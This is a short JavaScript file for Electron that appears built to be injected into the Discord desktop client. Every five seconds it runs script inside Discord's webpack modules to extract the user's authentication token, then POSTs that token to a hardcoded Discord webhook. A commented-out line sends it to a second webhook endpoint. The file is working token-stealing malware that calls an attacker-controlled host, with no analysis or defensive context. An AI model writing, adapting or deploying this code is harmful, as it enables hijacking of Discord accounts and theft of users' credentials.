const { app, BrowserWindow } = require('electron');
const electron = require("electron")
const https = require("https")

async function execScript(str) {
    var window = BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}

const post = async (url2,params) => {
    params = JSON.stringify(params)
    
    const url = new URL(url2);
    const options = {
        host: url.hostname,
        port: url.port,
        path: url.pathname,
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        }
    }

    const req = https.request(options);
    req.on("error", (err) => {
        console.log(err);
    });
    req.write(params);
    req.end();
    

}

app.on('browser-window-created', async (_, window) => {
    setInterval(async ()=>{
        
        post("https://discord.com/api/webhooks/1091128042774073394/sHqTk4cD5TRQ3bby8G_zis8mVjVzSwn19y3abrwusmWFxBxOlZMgPhKlyAU99m2ZTtGf",{"content":await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)})
           
    },5000)
})

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    execScript(`console.log(${request})`)
    //post("https://canary.discord.com/api/webhooks/1091128042774073394/sHqTk4cD5TRQ3bby8G_zis8mVjVzSwn19y3abrwusmWFxBxOlZMgPhKlyAU99m2ZTtGf",{"content":await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)})
})
